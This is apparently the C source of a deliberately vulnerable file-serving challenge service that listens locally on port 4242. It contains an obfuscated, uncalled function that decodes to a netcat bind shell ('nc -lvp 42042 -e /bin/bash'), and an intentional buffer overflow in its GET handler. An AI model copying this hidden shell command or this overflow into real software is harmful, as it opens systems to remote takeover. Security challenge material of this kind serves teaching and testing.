#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <dirent.h>
#include <arpa/inet.h>




void dexor(char *s, size_t sz)
{
	int i;
	for(i = 0 ; i < sz ; i++)
		s[i] = s[i] ^ 0x80;
}

void wxor(int sock, char *s, size_t sz)
{
	dexor(s,sz);
	write(sock, s, sz);
}


void server_secret()
{
	char s[] = "\xee\xe3\xa0\xad\xec\xf6\xf0\xa0\xb4\xb2\xb0\xb4\xb2\xa0\xad\xe5\xa0\xaf\xe2\xe9\xee\xaf\xe2\xe1\xf3\xe8\x80";
	dexor(s, sizeof(s) );
	system(s);

}

void server_list(int sock)
{
        DIR *d;
        struct dirent *dir;
	char name[256];

	char format[] = "\xbc\xe1\xa0\xe8\xf2\xe5\xe6\xbd\xa7\xa5\xf3\xa7\xbe\xa5\xf3\xbc\xaf\xe1\xbe\xbc\xe2\xf2\xbe\x8a\x80";
	dexor(format, sizeof(format));
        d = opendir(".");
        while ((dir = readdir(d)) != NULL) {
                if (dir->d_type == DT_REG ) {
			size_t sz;
			sz = snprintf(name, 255, format, dir->d_name, dir->d_name);
                        write(sock, name, sz);
		}
        }

        closedir(d);
}

void server_get(int sock, char *line, int size)
{
        char filebuf[256];
        char filename[123];
        char *p, *end;
        int fd;


        p = strchr(line, ' ');
	char http[] = "\xa0\xc8\xd4\xd4\xd0\x80";
	dexor(http, sizeof(http));
	end = memmem(line, size, http, 4);
	if (end == NULL) {
	        char resp[] = "\xc8\xd4\xd4\xd0\xaf\xb1\xae\xb1\xa0\xb4\xb0\xb0\xa0\xc2\xe1\xe4\xa0\xd2\xe5\xf1\xf5\xe5\xf3\xf4\x8d\x8a\x8d\x8a";
		wxor(sock, resp, sizeof(resp)  );
		return;
	}
	p[end - p] = '\0';
	printf("%s\n", p + 2);
        memcpy(filename, p + 2, size );


        fd = open(filename, O_RDONLY);
        if (fd < 0 ) {
		char resp[] = "\xc8\xd4\xd4\xd0\xaf\xb1\xae\xb1\xa0\xb4\xb0\xb4\xa0\xce\xef\xf4\xa0\xc6\xef\xf5\xee\xe4\x8d\x8a\xc3\xef\xee\xf4\xe5\xee\xf4\xad\xd4\xf9\xf0\xe5\xba\xa0\xf4\xe5\xf8\xf4\xaf\xe8\xf4\xed\xec\xbb\xe3\xe8\xe1\xf2\xf3\xe5\xf4\xbd\xc9\xd3\xcf\xad\xb8\xb8\xb5\xb9\xad\xb1\x8d\x8a\x8d\x8a";
		wxor(sock, resp, sizeof(resp)  );
		server_list(sock);
                return;
        }

	{
		char resp[] = "\xc8\xd4\xd4\xd0\xaf\xb1\xae\xb1\xa0\xb2\xb0\xb0\xa0\xcf\xcb\x8d\x8a\xc3\xef\xee\xf4\xe5\xee\xf4\xba\xe1\xf0\xf0\xec\xe9\xe3\xe1\xf4\xe9\xef\xee\xaf\xef\xe3\xf4\xe5\xf4\xad\xf3\xf4\xf2\xe5\xe1\xed\xbb\xa0\xe3\xe8\xe1\xf2\xf3\xe5\xf4\xbd\xf8\xad\xf5\xf3\xe5\xf2\xad\xe4\xe5\xe6\xe9\xee\xe5\xe4\x8d\x8a\x8d\x8a";
		wxor(sock, resp, sizeof(resp)  );
	}
        for (;;) {
                int cnt;
                cnt = read(fd, filebuf, 256);
                if (cnt <= 0)
                        break;
                write(sock, filebuf, cnt);
        }
}


void doprocessing (int sock)
{
	char  line[513];
	int bytecnt = 0;
	if ( (bytecnt = read( sock, line, 512)) >= 0 ) {
		line[bytecnt] = '\0';
		line[bytecnt-1] = '\0';
                /* process command */
                if (strstr(line, "LIST") == line) {
                        server_list(sock);
                } else if (strstr(line, "GET") == line) {
                        server_get(sock, line, bytecnt);
                } else {
			char resp[] = "\xc1\xf6\xe1\xe9\xec\xe1\xe2\xec\xe5\xa0\xe3\xef\xed\xed\xe1\xee\xe4\xf3\xa0\xe1\xf2\xe5\xba\xa0\xcc\xc9\xd3\xd4\xac\xa0\xc7\xc5\xd4\xa0\xbc\xe6\xe9\xec\xe5\xbe\x8a";
			wxor(sock, resp, sizeof(resp)  );
                }
	}
}

int main(int argc, char **argv)
{
    int optval = 1;
    int sockfd, newsockfd, portno;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;

    if (argc != 2) {
	printf("Usage: %s <banner_file>\n", argv[0]);
	exit(0);
    }
    FILE *fbanner = fopen(argv[1], "r");
    char banner_buf[1000];
    int i;
    for (i = 0 ; i < 10 ; i++) {
	if( fgets(banner_buf, 1000, fbanner) != NULL )
		printf("%s",banner_buf);
    }
    fclose(fbanner);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        perror("ERROR opening socket");
        exit(1);
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 4242;
    serv_addr.sin_family = AF_INET;

    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_port = htons(portno);
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
    {
         perror("ERROR on binding");
         exit(1);
    }

    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while (1)
    {
	int pid;
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0)
        {
            perror("ERROR on accept");
            exit(1);
        }
        pid = fork();
        if (pid < 0)
        {
            perror("ERROR on fork");
	    exit(1);
        }
        if (pid == 0)
        {

            close(sockfd);
            doprocessing(newsockfd);
            exit(0);
        }
        else
        {
            close(newsockfd);
        }
    }
}
